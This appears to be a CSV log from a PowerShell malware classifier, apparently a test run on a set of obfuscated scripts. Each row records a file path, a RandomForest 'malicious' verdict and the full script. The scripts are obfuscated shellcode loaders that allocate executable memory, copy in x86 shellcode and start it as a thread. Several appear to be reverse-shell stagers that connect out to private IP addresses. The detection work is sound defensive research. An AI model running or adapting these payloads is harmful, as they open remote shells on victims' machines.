exte','b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4','t 0x1000){4w0g = 4w0z.Length};4w0x=4w0w::VirtualAlloc(0,0x1000,4w0g,0x40);for (4w0i=0;4w0i -le (4w0z.Length-1);4w0i++) {4w0w::memset([IntPtr](4w0x.ToInt32()+4w0i), 4w0z[4w0i], 1)};','c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc','x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0','ame jIRWin32jIR -namespace','x')) -CReplaCE  'fKy',[CHAR]39  -CReplaCE'jIR',[CHAR]34  -REplaCe '4w0',[CHAR]36) | &amp;( $VERbosePrEfeRencE.TosTRinG()[1,3]+'X'-join'')",malicious,TP
2026-07-13 17:23:29,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\682.ps1,custom-ps-ml,UNKNOWN,803f7aa8-547d-45fb-8f48-d58bb37440cb,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2978,1630.07," . ( $SHELliD[1]+$SHellId[13]+'x') (((\""{35}{34}{59}{0}{12}{36}{69}{5}{8}{58}{65}{23}{18}{28}{29}{24}{48}{32}{56}{6}{26}{60}{44}{38}{46}{17}{3}{40}{22}{52}{27}{62}{7}{37}{9}{25}{67}{2}{10}{47}{19}{63}{39}{4}{51}{64}{33}{31}{61}{66}{53}{41}{43}{13}{45}{15}{16}{57}{55}{49}{30}{68}{1}{20}{54}{21}{14}{50}{11}{42}\"" -f 't(4Hykernel32.dll4Hy','VIi=0;HVIi','x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x','0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,','b8,0x90,0x01,0x00,0x00,0x','kSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport',',0x7c,0x02,0','8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x','(4Hymsvcrt.dll4Hy)]public static extern IntPtr memset(IntPtr dest, u','0x4b,0','5',';;){Start-slee',')]public static ext','xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00','Ptr](HVIx.ToInt32()+HVIi), HVIz[HVIi], 1)}','00',',0x00,0',',0x74,0x4a,0x01,0xd0,0x5','Win324Hy -namespace ',',0x3',' -le (HVIz.','h-1);HVIi++) {HVIw::memset([Int','x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x0',' = Add-Type -memberDefinition HVIc -Name 4Hy','te[]];[Byte[]]HVIz = ','x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x','x2c,0x20,0xc1,0xcf,0x','0x7d,0x24,0x75,0xe2,0x','Win32Functions -passthr','u;[By','f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;HVIg = 0x1000;if (HVIz.Length -gt','xc','x00,0x00,0x60,0x8','68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0',' hNk[DllImport(4Hykernel32.dll4Hy)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProt','HVIc =','ern IntPtr C','0c,','x52,0x10,0x8b,0x42,0','x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x','0','0x','p 60};','ff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0','7,0xe2,0xf0,0x52,0x57,0x8b,0',',0x10,0x','x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0','d,0x68,0x33','0xfc,0xe8,0x89,0x00,0','x53,0x57,0x68,0x02,0xd9,0xc8,0x5',';HVIw::CreateThread(0,0,HVIx,0,0,0);for (','29,0xc4,0x5','1,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,','74,0x61,','Lengt',',0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0','9,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61','x56,0x6a,0x00,0x68,0x58','int src, uint co','ect);[DllImpor','0d,0x01,0xc','0,0xa8,0x01,0x16,0x68,0x02,0x00,0x11,0x5c,0x89,0x','58,0x','2,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0','4,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x','unt);hNk;HVIw','e6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x','24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0',' 0x1000){HVIg = HVIz.Length};HVIx=HVIw::VirtualAlloc(0,0x1000,HVIg,0x40);for (H','reateThread(IntPtr lpThreadAttributes, uint dwStac')).rEplaCE(([chAR]104+[chAR]78+[chAR]107),[StRinG][chAR]39).rEplaCE(([chAR]52+[chAR]72+[chAR]121),[StRinG][chAR]34).rEplaCE(([chAR]72+[chAR]86+[chAR]73),'$'))",malicious,TP
2026-07-13 17:23:42,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\683.ps1,custom-ps-ml,UNKNOWN,003df254-6240-432d-95b9-b678d0ebc519,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2776,1620.11," &amp; ( $PSHOMe[21]+$PShoMe[34]+'X')( (((\""{23}{41}{2}{22}{28}{36}{45}{25}{10}{38}{4}{14}{46}{37}{31}{40}{32}{12}{5}{30}{9}{13}{33}{1}{35}{0}{3}{24}{21}{44}{19}{20}{27}{15}{7}{42}{29}{17}{39}{43}{11}{34}{16}{18}{6}{8}{26}\"" -f'x5b,0x61,0x59,0x5a,0x51,0xff',',0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,','rt(JMOkernel32.dllJMO)]',',0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb','hru;[Byte[]];[Byte[','7,0xe','+) {CXTw::memset([IntPtr](CXTx.ToInt32()+CXTi), CXTsc','0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,','[CXTi], 1)};CXTw::Cre','x52,','ags, IntPtr lpThreadId);[DllImport(JMOmsvcrt.dllJMO)]public static extern IntPtr memset(IntPtr dest, uint src, ui','x75,0xec,0xc3;CXTsize =','3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc','0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0',']]CXTsc = ','61,','gth};CXTx=CXTw::VirtualAlloc(0,0x1000,CXTsize,0x40);for (CX',',0x00,0','Ti=0;CXTi -le (CXTsc.Length-1);CXTi+',',0x50,0x50,0x50,0x40,0','x50,0x40,0x50,0x68,0xea,0x0f,','50,0x68,0x29,0x80,0x6b,0x00,0xff,0','p','CXTc = 451[DllImport(JMOkernel32.dllJMO)]public static extern IntPtr VirtualAlloc(IntPt',',0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x','ze, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFl','ateThread(0,0,CXTx,0,0,0);for (;;){Start-sleep 60};','0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x','ublic static extern IntPtr CreateTh','4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a','2,0xf0,0','0x00,0x60,0x89,0xe5,0x31,0xd2,0','x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x','x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31',' 0x1000;if (CXTsc.Length -gt 0x1000){CXTsize = CXTsc.Len','0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0','read(IntPtr lpThreadAttributes, uint dwSt','xe8,0x89,0x00,0x00,','nt count);451;CXTw = Add-Type -memberDefinition CXTc -Name JMOWin32JMO -namespace Win32Functions -passt','x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0x','x64,0x8b,0x52,0','r lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImpo','0x','c8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0','xd5,0x50','ackSi','0xfc,0')) -cREPLACE'JMO',[chaR]34 -cREPLACE'CXT',[chaR]36  -rEPlacE([chaR]52+[chaR]53+[chaR]49),[chaR]39) )",malicious,TP
2026-07-13 17:23:55,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\685.ps1,custom-ps-ml,UNKNOWN,8d27db73-e61c-4dfb-924d-1a8cd250ff29,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2932,1583.48,". ( $PSHOmE[4]+$pShOme[34]+'X') (((\""{36}{38}{10}{18}{26}{39}{2}{5}{32}{43}{20}{46}{11}{14}{1}{22}{29}{3}{30}{24}{37}{42}{33}{23}{7}{45}{35}{0}{47}{41}{9}{25}{44}{8}{17}{19}{4}{13}{31}{40}{21}{34}{12}{15}{48}{28}{16}{27}{6}\""-f',0xb1,0xdc,0x39,0x2c,0x','7,0x83,0xc',' lpParameter, uint dwCreationFlags, IntP','1,0x51,0xd2,0x81,0xb6,0xd2,0x59,0xf4,0xf9,0xe3','9,0xca,0x72,0x4b,0x7','tr lpThreadId);[DllImport(ZkXmsvcrt.dllZkX)]public stati','leep 60};','bd,0xbe,0x55','xc8,0xee,','0xc9,0x9a,0x23,0x89,0x45,0x5a,0','r VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(ZkXkernel3','[]];[Byte[]]nVxz = 0xb8,0x56,0x60,0xe7,0xe4,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5d','th -gt 0x1000){nVxg = nVxz.Length};nVxOtjb=nVxw::VirtualAlloc','0,',',0x29,0xc9,0xb1,0x4','(0,0x1000,nVxg,0x40);for (nVxi=0;nVxi -le (nV','::memset([IntPtr](nVxOtjb.ToInt32()+nVxi), nVxz[nVxi','0x19,0x7a,0x64,0x96,0x03,0xf0,0x15,0x57,0x9e,0x7c,0x15,0xd3,0x2d,0x80,0xdb','2.dllZk',',0x14,0x5b,0x92,0x8b,0xd4,0x16,0xc8,0x1d,0xea,0x8c,0x67,0xa1,0x7e,0x2b,0x2e,0xf6,0x16,0x31,0x17,0x30,0xb','in32ZkX -namespace W','3,0x02,0xaa,0xb','5,0x04,0x31,0x45,0x0f,0x03,0x45,0x59,0x82,0x12,0x18,0x8d,0xc0,0xdd,0xe',',0x38,0x9a,0x7f,0x32,0x9a,0x69,0x27,0x9e,0x1b,0x',',0x88,0x54,0x4d,0x87,0x88,0x89,0x05,0xa6,0','x94,0','X)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpS','], 1)};nVxw::CreateThread(0,0,nVxOtjb,0,0,0);for (;;){Start-s','xi++) {nVxw','1,0x4d,0xa5,0x54,0x04,0x7c,0xe5,0x03,0x4c,0x2e,0xd5,0x40,0x00,0xc2,0x9e,0x05,0xb',',0xf2,0xc4,0x98,0x67,0x09,0x19,0x7b,0x56,0xc2,0x6c,0x7a,0x9f,0x3f,0x9c,0x2e,0x48,0x4b,0x33,0xdf,0xfd,0x01','0x5f,0x3d,0x23,0x7d,0x8f,0xbd,0xb3,0x2b,','c extern IntPtr memset(IntPtr dest, uint src, uint count','xa1','7,0x9f,0xd4,0x92,0xcd,0xf1,0xe4;nVxg = 0x1000;if (nVxz.Leng',',0xa2,0x1b,0x71,0xe9,0xdb,0x7c,0xda,0x56,0x7e,0xf6,0xf6,0x83,0xf3,0x55,0x9e,0x60,0x3e,0x66,0x5e,0xef,0x49,0x15,0x6c,0xb0,0xe1','nVxeh6e = RUl[DllImport(ZkXkernel32.dllZkX)]publi','xb9,','c static extern IntPt','tartAddress, IntPtr','0xc5,0xbd,0xdb,0x8b,0xbd,0xed,0xfe,0xd3,0x6b,0x82,0x53,0x46,0x94,0xf3,0x00,0xc1,0xfc,0xf9,0x7f,0x25,0xa','a0,0x2a,0x2d,0xcf,0xb9,0xdb,0x4f,0x2f,0xa8,0x43,0xd9,','0x1f,0x1e,0xf1,0x19,0xa1,0xf3,0x89,0x13,0xb9,0x10,0xb7,0xea,0x32,0xe2,0x43,0xed,0x92,0x3b,0xab,0x42,0xdb,0xf4,0x5e,0x9a,0x1b,0x32,0x81,0xe9,0x55,0x41,0x3c,0xea,0',');RUl;nVxw = Add-Type -memberDefinition nVxeh6e -Name ZkXW','x69,0x36,0x32,0xfe,0x65,0x69,0x22,0x01,0xac,0x02,0',',0x17,0x0a,0xb4,0x32,0x3b,0x8d,0x19,0x49,0x47,0x06,0x9c,0x9e,0xce,0x5c,0xbb,0x3a,0x8b,0x07','in32Functions -passthru;[Byte','45,0x23,0x10,0x88,0xd9,0xda,0x9b,0xe9,0xf0,0x18,0xcf,0xb9,0x6a,0x89,0x70,0x52,0x6b,0x36,0xa5,0xcf,0x6e,0x','xz.Length-1);nV')).REPlaCe(([chaR]110+[chaR]86+[chaR]120),'$').REPlaCe(([chaR]90+[chaR]107+[chaR]88),[sTRing][chaR]34).REPlaCe(([chaR]82+[chaR]85+[chaR]108),[sTRing][chaR]39))",malicious,TP
2026-07-13 17:24:01,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\703.ps1,custom-ps-ml,UNKNOWN,6d28e934-6396-4cc2-ad1f-2cd9207ecda8,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2875,1499.06," INvoKE-ExPREsSION( ((\""{28}{19}{3}{44}{47}{18}{6}{23}{32}{22}{41}{8}{34}{48}{40}{5}{15}{29}{20}{43}{10}{7}{39}{21}{45}{13}{17}{35}{11}{4}{30}{33}{12}{31}{46}{14}{2}{24}{16}{42}{0}{1}{25}{37}{9}{36}{27}{38}{26}\"" -f'9,0xb4,0xc1,0x7e,0x05,0xb9,0x05,0x7f,0xd5,0xef,0x4f,0x7f,0xbd,0x57,0x34,0x2c,0xd8,0x97,0xe1,0x40,0x71,0x02,0x0a,0x31,0x26,0x85,0x62,0','xbf,0x11,0xe1,0x2c,0x40,','ae,0x1a,0xa4','lNHW)]publi',',0','e4,0xef,0xb0,0xaf,0x56,0xc','ibute','25,0x2b,0x9d,0xb0,0x04,0xfa,0x96,0xea,0x86,0xfc,0x7b,0x87,0x8e,0xe6,0x9','espace Win32Functions -passthru;[Byte[]];[Byte[]]rTcz = 0xdb,0xdb,0xbf,0xd9,0x6','cg,0x40);for (rTci=0;r','d,0xb6,0xc5,0xb1,0x','b','16,0x6d,0x4','0x58','0x','0,',',0x3a,0xa1,0x6f,0x94,0xd2,0xab,0x56,0xd2,0x7c,0x53,0xbd,0x',',0x03,0x3c,0x51,0xf9,0xe9,0x93,0x6e,0x19,0x52,','ThreadAttr','pe, uint flProtect);[DllImport(NHWkernel32.dl','5a,0x57,0x19,0x17,0x5b,0xc4,0x59,0x36,0xdf,0x17,0x8e,0x98,0xde,0','09,0xfd,0xaa,0x8b,0x7c,0xf7,0xc9,0x36,0x87,0xcc,0xb0,0xec,0x02,0xd7','NHWmsvcrt.dllNHW)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);7xE;rTcw = Add-Type -memberDefinition rTcaepXKZ -Name ','s, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpPara',',0xc3','0x74,0xf3,0x11,0x97,0xb0,0x81,0x7b,0x2b;rTcg = 0x1000;if (r','};','aepX.ToInt32()+rTci), rTcz[rTci], 1)};rTcw::Creat','rTcaepXKZ = 7xE[DllImport(NHWkernel32.dllNHW)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationTy','0xb3,0xe2,0x5a,0xab,0x96,0x16,0xe9,0xd9,0x3e,0x18,0x','x51,0x7e,0x98,0x66,0x38,0','b,0xc3,0xe6,0xf9,0xdc,0xb0,0xd4,0xa6,0x76,0x5f,0x54,0x2e,0x51,0x98,0x9b,0x05,0x25,0x36,0x62,0xa6,0x56,0x1e,0xa0,0xf2,0x06,0x08,0x01,0x7b,0xcd,0xc8,0xae,0xae,0x78,0xcc,0x38,0xcb,0x3b,0xec,0x9b,0x83,0xc1,0xf0,0xca,0x0f,0x4f,0x16,0xbc,0xff,0x1f,0x87,0x7c,0x50,0xe0,0x77,0x14,0xba,0xef,0xa8,0x04,0xc5,0x25,0xc1,0xae,0x2a,0x90,0xb9,0x46,0xd2,0xb9,0x32,0xf7,0x1b,0x14,0x3f,0x37,0x97,0x9b,0xbf,0xf9,0x50,0xd1,0xd3','meter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(','x','a,0x54,0x42,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x3','0x4b,0xc','Tci -le (rTcz.Length-1);rTci++) {rTcw::memset([IntPtr](rTc','Tcz.Length -gt 0x1000){rTcg = rTcz.Length};rTcaepX=rTcw::VirtualAlloc(0,0x1000,rT','eThread(0,0,rTcaepX,0,0,0);for (;;){Start-sleep 60','8,0xa2,0x59,0x9c,0x6a,0x58,0x58,0x74,0xa3,0xa1,0xf7,0xb9,0x0c,0x50,0x','0x88,0xa1,0xbe,0x05,0xce,0x4a,0x3f,0xd5,0xaf,0xc3,0xda,0x','NHWWin32NHW -nam','6','xd7,0xc3,0xd9,0x27,0x05,0x29,0x8b,0xf0,0x41,0x9c,0x3c,0x75,0x1f,0x1','c static extern I',',0x12,0x66,0xb4,0x33,0xa3,0xab,0x23,0xb7,0xaf,0x00,0x27,0x9f,0xb3,0x97,0xe4,0xab,0xcf,0x1c,0x0b,0x7c,0x46,0x66,0x28,',',0x6d,0x91,0xac,0x8e,0x3b,','ntPtr CreateThread(IntPtr lp','1,0x78,0x18,0x83,0xc0,0x04,0x03,0x78,0xcd,')).rEplace('rTc','$').rEplace('7xE',[strinG][chAR]39).rEplace(([chAR]78+[chAR]72+[chAR]87),[strinG][chAR]34) )",malicious,TP
2026-07-13 17:24:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\778.ps1,custom-ps-ml,UNKNOWN,9728a0ac-7169-45a7-a363-a35c9324910f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3274,1569.25,"(((\""{56}{49}{13}{45}{40}{8}{47}{66}{73}{21}{76}{64}{53}{0}{51}{20}{65}{42}{57}{72}{46}{63}{25}{38}{10}{68}{27}{17}{32}{67}{9}{31}{43}{54}{29}{52}{58}{61}{71}{28}{1}{39}{34}{44}{41}{24}{69}{50}{22}{18}{48}{16}{7}{30}{70}{15}{37}{62}{77}{60}{35}{19}{14}{6}{23}{55}{75}{33}{26}{2}{4}{59}{12}{3}{36}{74}{5}{11}\"" -f ' memset(IntPtr dest, u','0x83,0xdf,0xc7,0xfc,0xf4,0xe0,0x3','ig = 4Diz.Length};4Di0HM=4Diw::VirtualAlloc(0,0x1000,4Dig,0x40);for (4Dii=0;4Dii -le (4D','M.ToInt32','iz.Length-1);4Dii++) {4Diw::memse','{Start-sle','xb0,0x09,0x9','0x30,0x9','ui','0xe3,0xe2,0xa6,0xf4,0xf2,0x22,0xf7,0xf5,0x58,0x0b,0x37,0x04,0xa1,0x4b,0xf0,0xf7,0xd4,0xa5,0x','x83,0xc2,0x04,0x31,0x42,0x16,0x03,0x42,0x16,0xe2,0x03,0x68,0xf3,0x7b,0xeb,0x91,0x04,0x1c,0x62,0x74,0x35,0x1c,0x10,0xfc,0x66,0xac,0x53,0x50,0x8b,0x47,0x31,0x41,0x18,0x25,0x9d,0x66,0xa9,0x80,0xfb,0x49,0x2a,0xb8,0x3f,0xcb,0','ep 60};','tPtr](4Di0H','ic stati','7c,0x72,0x95,0x73,0x27,0','a,0x57,0xce,0x5c,0xe1,0x0a,0x59,0x62,0xdc,0x21,0x26,0xf4,0xde,0xa5,0xa6,0x04,0xb6','f,',',0x2a,0','0xba,0x97,0x3f,0x3f,0x54,0x35,0xc6,0xa7',',0x2a,0x1e,0xcb,0xe5,0xac,0xde,0x10,0x','ame k4qWin32k4q -na','eThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllIm','f,0x44,0xe2,0xe9,0x15,0xb0,0x52,0x45,','3,0',',0xa7,0x49,0x','1,0x51,0xb8,0xf6,0','gt 0x1000){4D','b,0x90,0x0b,0x66',',0x20,0x14,0x50,0xb8,0x8d,0xc4,0xc1,0x6d,0x61,','2,','6,0','02,0x','xd5,0x76,0x8a,0x7e,0x8e,0xfd,0x38,0x6f,0xbb,0x48,0x80,0x04,0xf7,0x5d,0x80,0xf9,0x40,0x5f,0xa1,0xaf,0xdb,0x06,0x61,0x51,0x0f,0x33,0x28,0','0x4c,0xa5,0x5f,0xdd,0xbe,0xf4,0xa8,0x15,0x90,0xc5,0xe2,0x55;4Dig = 0x1000;if (4Diz.Length -','0x4d,0xd9,0xf2,0xf6,0x8d,0','0x0d,0xd7,0xea,0x94,0xe4,0x6d','()+4Dii), 4Diz[4Dii]',',0xc5,0xa6,0x44,0x','x94,0x1b,0xf9,0','d,0xad,0xa9,0x74,0xbd,0x01,0x1d,0xe2,0xf4,','lpAddress, uint dwSize, ','x39,0x18,0x85,0xe3,0x3a','thru;[Byte[','85,0xee,0x71,','x35,0xa8,0xc3,0xbe,0x2f,0x78,0x2c,0x91,0xc7,0xd7,0xa5,0x8e,0xde,0x28,0x60,0','c extern IntPtr VirtualAlloc(IntPtr ','a,0x31,','nt flAllocationType',',0xdf,0xba,0x13,0x52,0xd','l','xb4,0x7e,0x7','int src, uint count);gVR;4Diw = Add-Type -memberDefinition 4Disf73 -N','0xdb,0x4e,0xda,0xf7,0xbd,0x05,0xd0,0xbc,0xca,0x42,0xf5,0x43,0x1f,0xf9,0x01,0xcf,0x9e,0x2e,0x80,0x8b,0x84,0xea,0xc8,0x48,0xa5,0xab,0xb4,0x3f,0xda,0xac,0x16',' IntPtr','0x78,0x51,0x7b,0x62,0xda,0x1','x51,0xc9,0x49,0x9c,0x53,0x','4Disf73 = gVR[DllImport(k4qkernel32.dllk4q)]pub',']];[Byte[]',',0x9f,0x7e,0xa6,0xbb,0xf4,0xf3,0xe5,0xd3,0x64,0x6e,0x62,0x24,0x11,0x07,0xe3,0x4a,0x88,0xb3,0x9b,0x','t([In','8,0x4a,','de,0x3d,0x1d,0x5','46,0x95,0xce,0x1c,0xe2,0x4a,0xea,0x62,0x3f,0xff,0xa7,0xcf,0x36,0xe7,0x1','0xc9,0xb','.dllk4q)]public static extern','mespace Win32Functions -pass',', uint flProtect);[DllImport(k4qkernel32.dllk4q)]public static extern In','x49,0x4c,0x7e,','xa8,0xc3,0x13,0x2','70,0x69,0xf4,0xda,0x2f,0xdd,0xac,0xb4,0x24,0','x12,0xa','b',']4Diz = 0xdb,0xc4,0xd9,0x74,0x24,0xf4,0x5','tPtr Creat',', 1)};4Diw::CreateThread(0,0,4Di0HM,0,0,0);for (;;)','05,0x8f,','port(k4qmsvcrt','f,0x98,0x48,0xc8,0x9f,0x58,0x1b,0x5e,0xc'))  -CReplacE'k4q',[CHar]34-CReplacE ([CHar]52+[CHar]68+[CHar]105),[CHar]36  -rEPlACe 'gVR',[CHar]39) | invoKE-exPressiOn",malicious,TP
2026-07-13 17:24:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\82.ps1,custom-ps-ml,UNKNOWN,d40f8400-fe1d-4868-bd11-676018c99c2b,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2762,1725.58,".( $ShELLID[1]+$SheLLiD[13]+'X')( (((\""{5}{0}{24}{20}{38}{40}{10}{6}{43}{13}{45}{1}{18}{4}{15}{44}{2}{42}{9}{14}{31}{46}{7}{26}{35}{41}{32}{30}{12}{3}{11}{8}{19}{36}{39}{23}{27}{34}{29}{21}{25}{37}{22}{16}{33}{28}{17}\"" -f'l32.dll86N)]public static ex','0x0c,0x8b',',0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0','00,0x00,0x68,0x77,0x73,0x32,0x5f,0','0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20','zb5c = EMz[DllImport(86Nkernel32.dll86N)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(86Nkerne','nt);EMz;zb5w = Add-Type -memberDefinition zb5c -Name ','0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf','x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x2','01,0xd0','readId);[DllImport(86Nmsvcrt.dll86N)]public static extern IntPtr memset(IntPtr dest, uint src, uint cou','x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0','x86,0x5d,0x68,0x33,0x32,0x','tions -pa',',0x50,',',0',';zb5w::CreateThr','60};',',0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,','9,0','eThr','8,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,','zb5i), zb5z[zb5i], 1)}','x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x','tern IntPtr Creat','0x85,0xf6,0x75,0xec,0xc3;zb5g = 0x1000;if (zb5z.Length -',',0x0d,0x01,0xc','56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0x',';for (;;){Start-sleep ','b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x6','8,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0','0x8b,0x48,0x18,0x8b,0x','b,0x5','ead(0,0,zb5x,0,0,0)','d5,0x8','7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0','x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x52,0xbd,0x68,0x02,0x00','gt 0x1000){zb5g = zb5z.Length};zb5x=zb5w::VirtualAlloc(0,0x1000,zb5g,0x40);for (zb5i=0;zb5i -le (zb5z.Length-1);zb5i++) {zb5w::memset([IntPtr](zb5x.ToInt32()+','ead(IntPtr lpThreadAttribute',',0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0','s, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpTh','x66,0x8b,0x0c,0x4b,0x8','x4a,0x','86NWin3286N -namespace Win32Func','xc1,0xcf','ssthru;[Byte[]];[Byte[]]zb5z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,','58,0x20,0x01,0xd3,')) -cReplace'EMz',[ChAr]39  -RePLAce  '86N',[ChAr]34  -RePLAce  ([ChAr]122+[ChAr]98+[ChAr]53),[ChAr]36) )",malicious,TP
